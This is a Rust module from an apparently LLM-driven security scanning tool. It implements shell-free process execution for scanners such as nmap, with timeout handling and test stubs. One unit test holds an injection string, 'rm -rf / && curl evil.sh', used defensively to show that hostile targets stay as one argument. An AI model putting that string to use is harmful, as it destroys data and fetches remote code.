//! Phase 4: execution. The executor is **how** a provider actually runs —
//! today a direct local process spawn, in the future optionally an HTTP
//! API, browser protocol, or MCP connection. Providers translate semantic
//! requests into their own invocation; executors run it.
//!
//! ```text
//! CapabilityRequest (semantic, validated)
//!   -> Provider (argument translation, trusted runtime code)
//!   -> Executor (this module: process spawn, NO shell)
//!   -> ProcessOutput (raw evidence)
//!   -> ToolResult (evidence + provenance)
//!   -> parsers (Phase 5)
//!   -> Observation
//! ```
//!
//! The LLM never touches the shell. Arguments come from
//! `ToolDefinition::default_args` plus whitelisted semantic option
//! bindings; the runtime supplies only the target.

use std::collections::HashMap;
use std::process::Command;
use std::sync::mpsc;
use std::thread;
use std::time::Duration;

/// Raw evidence from one execution: stdout/stderr/exit code exactly as the
/// provider produced them, before any parsing. Parsers are lossy; evidence
/// is not. Preserved on [`ToolResult`] for debugging, auditability,
/// re-parsing, and evidence provenance.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ProcessOutput {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub timed_out: bool,
    pub error: Option<String>,
}

/// Result of executing a provider against a target. Carries the raw
/// evidence plus provenance (which provider, which capability, which
/// target) — everything an audit trail or a re-parse needs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToolResult {
    pub tool_id: String,
    pub capability: String,
    pub target: String,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub timed_out: bool,
    pub error: Option<String>,
}

impl ToolResult {
    /// Errors prefixed with this marker are deterministic rejections
    /// (target-kind guards, unsupported invocations) — re-running the
    /// exact same request can never succeed, so the runtime's retry
    /// loop must not re-attempt them.
    pub const NON_RETRYABLE_PREFIX: &'static str = "not retryable: ";

    pub fn success(&self) -> bool {
        self.exit_code == 0 && self.error.is_none() && !self.timed_out
    }

    /// True when this result's error is deterministic (see
    /// [`Self::NON_RETRYABLE_PREFIX`]).
    pub fn is_non_retryable(&self) -> bool {
        self.error
            .as_deref()
            .is_some_and(|e| e.starts_with(Self::NON_RETRYABLE_PREFIX))
    }

    pub fn combined_output(&self) -> String {
        if self.stdout.is_empty() && self.stderr.is_empty() {
            return String::new();
        }
        match (&self.stdout, &self.stderr) {
            (s, _) if !s.is_empty() => s.clone(),
            (_, s) => s.clone(),
        }
    }

    pub fn error(tool_id: &str, capability: &str, target: &str, msg: String) -> Self {
        Self {
            tool_id: tool_id.to_string(),
            capability: capability.to_string(),
            target: target.to_string(),
            exit_code: -1,
            stdout: String::new(),
            stderr: String::new(),
            timed_out: false,
            error: Some(msg),
        }
    }

    /// A deterministic failure: same request, same outcome. Used by
    /// target-kind guards so a URL aimed at a filesystem scanner fails
    /// instantly with actionable feedback instead of three retries.
    pub fn error_non_retryable(tool_id: &str, capability: &str, target: &str, msg: String) -> Self {
        Self::error(
            tool_id,
            capability,
            target,
            format!("{}{}", Self::NON_RETRYABLE_PREFIX, msg),
        )
    }
}

/// Execution abstraction: how a provider's invocation actually runs.
/// Implementations must never use a shell — the production executor
/// spawns the resolved executable directly with an argv list.
pub trait ProcessExecutor: Send + Sync {
    fn run(&self, exe: &str, args: &[String], timeout: Duration) -> ProcessOutput;
}

/// Production executor: direct process spawn via `std::process::Command`,
/// no shell, with a hard timeout enforced by a watchdog thread + channel.
#[derive(Debug, Clone, Copy)]
pub struct LocalProcessExecutor {
    timeout: Duration,
}

impl LocalProcessExecutor {
    /// Default watchdog: 5 minutes per invocation.
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(300),
        }
    }

    pub fn with_timeout(timeout: Duration) -> Self {
        Self { timeout }
    }
}

impl Default for LocalProcessExecutor {
    fn default() -> Self {
        Self::new()
    }
}

impl ProcessExecutor for LocalProcessExecutor {
    fn run(&self, exe: &str, args: &[String], _timeout: Duration) -> ProcessOutput {
        spawn_with_timeout(exe, args, self.timeout)
    }
}

/// Test stub keyed by executable file name (e.g. "nmap" for
/// "/usr/bin/nmap"). Returns pre-configured output; unconfigured
/// executables yield an error result. Keeps the test suite offline and
/// deterministic while exercising the real provider/translation path.
pub struct StubExecutor {
    results: HashMap<String, ProcessOutput>,
}

impl StubExecutor {
    pub fn new() -> Self {
        Self {
            results: HashMap::new(),
        }
    }

    /// Configure a successful run for `exe_name` returning `stdout`.
    pub fn success(exe_name: &str, stdout: &str) -> Self {
        Self::new().with_output(
            exe_name,
            ProcessOutput {
                exit_code: 0,
                stdout: stdout.to_string(),
                stderr: String::new(),
                timed_out: false,
                error: None,
            },
        )
    }

    pub fn with_output(mut self, exe_name: &str, output: ProcessOutput) -> Self {
        self.results.insert(exe_name.to_string(), output);
        self
    }
}

impl Default for StubExecutor {
    fn default() -> Self {
        Self::new()
    }
}

impl ProcessExecutor for StubExecutor {
    fn run(&self, exe: &str, _args: &[String], _timeout: Duration) -> ProcessOutput {
        let name = std::path::Path::new(exe)
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_default();
        self.results
            .get(&name)
            .cloned()
            .unwrap_or_else(|| ProcessOutput {
                exit_code: -1,
                stdout: String::new(),
                stderr: String::new(),
                timed_out: false,
                error: Some(format!("stub: no result configured for '{exe}'")),
            })
    }
}

/// Test double that records every invocation (exe + argv) and returns a
/// fixed output. Used to prove command-safety properties: what argv the
/// provider actually constructed.
#[cfg(test)]
pub(crate) struct RecordingExecutor {
    pub calls: std::sync::Mutex<Vec<(String, Vec<String>)>>,
    pub output: ProcessOutput,
}

#[cfg(test)]
impl RecordingExecutor {
    pub fn succeeding() -> Self {
        Self {
            calls: std::sync::Mutex::new(Vec::new()),
            output: ProcessOutput {
                exit_code: 0,
                stdout: String::new(),
                stderr: String::new(),
                timed_out: false,
                error: None,
            },
        }
    }
}

#[cfg(test)]
impl ProcessExecutor for RecordingExecutor {
    fn run(&self, exe: &str, args: &[String], _timeout: Duration) -> ProcessOutput {
        self.calls
            .lock()
            .unwrap()
            .push((exe.to_string(), args.to_vec()));
        self.output.clone()
    }
}

/// Replace `{target}` placeholders in arg templates — both bare args
/// (`"{target}"`) and embedded ones (`"dir:{target}"`). `{script:name}`
/// placeholders expand to the absolute path of an embedded sidecar
/// script (see `infra::scripts`), written into the state dir on first
/// use. Also resolves `wordlists/...` relative to the medusa binary's
/// repo root so ffuf's `wordlists/common.txt` works both in `cargo run`
/// and installed binary.
pub fn resolve_args(template: &[String], target: &str) -> Vec<String> {
    template
        .iter()
        .map(|a| {
            let mut arg = a.replace("{target}", target);
            if let Some(rest) = arg.strip_prefix("{script:") {
                if let Some(name) = rest.strip_suffix('}') {
                    if let Some(path) = crate::infra::scripts::ensure_script(name) {
                        return path.to_string_lossy().into_owned();
                    }
                }
            }
            if arg.starts_with("wordlists/") {
                // Resolve relative to repo root (next to Cargo.toml) when running
                // from source, otherwise keep as-is for installed binary where
                // wordlists are bundled.
                let candidate = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(&arg);
                if candidate.exists() {
                    arg = candidate.to_string_lossy().to_string();
                }
            }
            arg
        })
        .collect()
}

/// Spawn a process with a timeout. Uses a dedicated thread + channel
/// to enforce the deadline without async runtime. **No shell is ever
/// used**: the executable path is invoked directly with an argv list,
/// so a malicious target string can only ever become a single argv
/// element, never a command.
pub(crate) fn spawn_with_timeout(
    exe: &str,
    args: &[String],
    timeout: Duration,
) -> ProcessOutput {
    let exe = exe.to_string();
    let args = args.to_vec();

    let (tx, rx) = mpsc::channel();

    thread::spawn(move || {
        let result = Command::new(&exe)
            .args(&args)
            .output()
            .map_err(|e| format!("failed to execute {exe}: {e}"));
        let _ = tx.send(result);
    });

    match rx.recv_timeout(timeout) {
        Ok(Ok(output)) => ProcessOutput {
            exit_code: output.status.code().unwrap_or(-1),
            stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
            timed_out: false,
            error: None,
        },
        Ok(Err(e)) => ProcessOutput {
            exit_code: -1,
            stdout: String::new(),
            stderr: String::new(),
            timed_out: false,
            error: Some(e),
        },
        Err(_recv_timeout) => ProcessOutput {
            exit_code: -1,
            stdout: String::new(),
            stderr: String::new(),
            timed_out: true,
            error: Some(format!("tool execution timed out after {timeout:?}")),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn resolve_args_substitutes_target() {
        let template = vec!["-sV".to_string(), "{target}".to_string()];
        let resolved = resolve_args(&template, "10.0.0.1");
        assert_eq!(resolved, vec!["-sV".to_string(), "10.0.0.1".to_string()]);
    }

    #[test]
    fn resolve_args_no_placeholder() {
        let template = vec!["--version".to_string()];
        let resolved = resolve_args(&template, "10.0.0.1");
        assert_eq!(resolved, vec!["--version".to_string()]);
    }

    #[test]
    fn resolve_args_substitutes_embedded_target() {
        // Schemes like grype's `dir:{target}` substitute in place, still as a
        // single argv element.
        let template = vec![
            "dir:{target}".to_string(),
            "-o".to_string(),
            "json".to_string(),
        ];
        let resolved = resolve_args(&template, "C:\\scan");
        assert_eq!(
            resolved,
            vec![
                "dir:C:\\scan".to_string(),
                "-o".to_string(),
                "json".to_string()
            ]
        );
    }

    #[test]
    fn resolve_args_empty() {
        let resolved = resolve_args(&[], "10.0.0.1");
        assert!(resolved.is_empty());
    }

    #[test]
    fn resolve_args_unknown_script_placeholder_is_kept_verbatim() {
        // Unknown sidecar names cannot be resolved to a script path — the
        // placeholder stays so the invocation fails loudly at the process
        // boundary instead of silently scanning something else.
        let template = vec!["{script:no-such.mjs}".to_string(), "--url".to_string()];
        let resolved = resolve_args(&template, "http://example.com");
        assert_eq!(
            resolved,
            vec!["{script:no-such.mjs}".to_string(), "--url".to_string()]
        );
    }

    #[test]
    fn resolve_args_known_script_expands_to_state_dir_path() {
        let template = vec!["{script:browser-observe.mjs}".to_string()];
        let resolved = resolve_args(&template, "http://example.com");
        assert_eq!(resolved.len(), 1);
        let p = resolved[0].replace('\\', "/");
        assert!(
            p.ends_with("/scripts/browser-observe.mjs")
                || p.ends_with("\\scripts\\browser-observe.mjs"),
            "expanded to {p}"
        );
        assert!(
            std::path::Path::new(&resolved[0]).is_file(),
            "script written"
        );
    }

    #[test]
    fn resolve_args_keeps_hostile_target_as_single_argv_element() {
        // A target containing shell metacharacters must never be split or
        // interpreted — it stays one argv element (no shell is involved).
        let template = vec!["-u".to_string(), "{target}".to_string()];
        let hostile = "example.com; rm -rf / && curl evil.sh";
        let resolved = resolve_args(&template, hostile);
        assert_eq!(resolved.len(), 2);
        assert_eq!(resolved[1], hostile);
    }

    #[test]
    fn tool_result_success() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: 0,
            stdout: "open".into(),
            stderr: String::new(),
            timed_out: false,
            error: None,
        };
        assert!(r.success());
    }

    #[test]
    fn tool_result_nonzero_exit_is_not_success() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: 1,
            stdout: String::new(),
            stderr: "error".into(),
            timed_out: false,
            error: None,
        };
        assert!(!r.success());
    }

    #[test]
    fn tool_result_error_is_not_success() {
        let r = ToolResult::error("nmap", "network.port_scan", "10.0.0.1", "not found".into());
        assert!(!r.success());
        assert_eq!(r.error.as_deref(), Some("not found"));
    }

    #[test]
    fn tool_result_timed_out_is_not_success() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: -1,
            stdout: String::new(),
            stderr: String::new(),
            timed_out: true,
            error: Some("timed out".into()),
        };
        assert!(!r.success());
    }

    #[test]
    fn tool_result_combined_output_prefers_stdout() {
        let r = ToolResult {
            tool_id: "nmap".into(),
            capability: "network.port_scan".into(),
            target: "10.0.0.1".into(),
            exit_code: 0,
            stdout: "some output".into(),
            stderr: "some error".into(),
            timed_out: false,
            error: None,
        };
        assert_eq!(r.combined_output(), "some output");
    }

    #[test]
    fn stub_executor_matches_by_executable_file_name() {
        let stub = StubExecutor::success("nmap", "port 22 open");
        let out = stub.run("/usr/bin/nmap", &[], Duration::from_secs(5));
        assert_eq!(out.exit_code, 0);
        assert_eq!(out.stdout, "port 22 open");
    }

    #[test]
    fn stub_executor_returns_error_for_unconfigured() {
        let stub = StubExecutor::new();
        let out = stub.run("/bin/nmap", &[], Duration::from_secs(5));
        assert!(out.error.is_some());
    }

    #[test]
    fn local_executor_runs_a_real_process_without_shell() {
        // `cmd /c echo` on Windows, `echo` elsewhere — both prove the
        // direct-spawn path executes and captures output.
        #[cfg(target_os = "windows")]
        let (exe, args): (&str, Vec<String>) = ("cmd", vec!["/C".into(), "echo medusa-ok".into()]);
        #[cfg(not(target_os = "windows"))]
        let (exe, args): (&str, Vec<String>) = ("echo", vec!["medusa-ok".into()]);

        let out = LocalProcessExecutor::with_timeout(Duration::from_secs(10)).run(
            exe,
            &args,
            Duration::from_secs(10),
        );
        assert!(out.error.is_none(), "spawn failed: {:?}", out.error);
        assert_eq!(out.exit_code, 0);
        assert!(
            out.stdout.trim().contains("medusa-ok") || out.stderr.trim().contains("medusa-ok"),
            "stdout={:?} stderr={:?}",
            out.stdout,
            out.stderr
        );
    }
}
